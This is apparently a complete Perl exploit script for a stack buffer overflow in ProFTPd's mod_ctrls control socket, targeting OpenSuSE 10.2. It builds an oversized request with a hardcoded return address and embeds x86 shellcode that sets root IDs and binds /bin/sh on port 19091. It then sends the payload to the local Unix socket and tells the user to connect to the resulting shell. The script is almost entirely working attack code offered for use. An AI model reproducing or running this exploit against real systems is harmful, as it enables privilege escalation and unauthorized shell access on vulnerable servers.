#!/usr/bin/perl -w
#
# Exploit for the ProFTPd mod_ctrls vulnerability.
# Stack Overflow in function
# int pr_ctrls_recv_request(pr_crls_cl_t *cl)
# unchecked buffer for arguments of the module
#
# connects to the unix domain socket and sends a string
# that is longer than the buffer (char[512]).
#
# Cheers to Alfredo "revenge" Pesoli for the implementation 
# on Ubuntu and Debian Etch
#
# works on OpenSuSE 10.2 on i686
# 
# http://www.devtarget.org
# Michael Domberg
#
# Usage: $ /usr/bin/perl proftpd-mod_ctrls-opensuse10_2.pl /path/to/local/socket
#
# Example (on OpenSuSE 10.2):
# $ /usr/bin/perl proftpd-mod_ctrls-opensuse10_2.pl /usr/local/var/proftpd/proftpd.sock
#
###############################
use strict;
use Socket;

# bind on port 19091
my $shell = 
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x31\xdb\xb0\x2e\xcd\x80".
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80".
"\x89\xc7\x31\xc9\x66\xb9\x4a\x93\x52\x66\x51\x43\x66\x53\x89\xe1".
"\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd".
"\x80\x31\xc0\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3".
"\x89\xd9\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\xeb\x18\x5e\x31\xc0\x88".
"\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d".
"\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

print "[+] Preparing attack string...\n";

my $rsock   = shift;

my $buf = "A"x520; 

use constant TEMPSOCK  => '/tmp/tmp.sock';

$buf = $buf."\0\0\x0a\xff"."AAAAaaaaAAAAaaaa"."\x77\xe7\xff\xff".$shell;
my $l = length($buf);
print "[+] Opening Unix Domain Socket to mod_ctrls \n";

socket (SOCK, PF_UNIX, SOCK_STREAM, 0)  or die "[-] Socket creation failed : $!";
my $rfile = sockaddr_un($rsock);

unlink TEMPSOCK;
my $lfile = sockaddr_un(TEMPSOCK);

bind (SOCK, $lfile) or die "[-] Creation of Unix Domain Socket failed. ($lfile)";
chmod (00700, TEMPSOCK);

connect (SOCK, $rfile) or die "\n [-] Connection to control socket failed.\n\n";

print "[+] Sending attack...\n";

send SOCK, pack("s2", 0),0;
send SOCK, pack("s2", 1,0),0;
send SOCK, pack("C", 188).pack("C",2).pack("s1",0),0;
send SOCK, $buf,0;

close SOCK;

print "\n [+] Attack String sent. Try to connect to Port 19091\n\n";
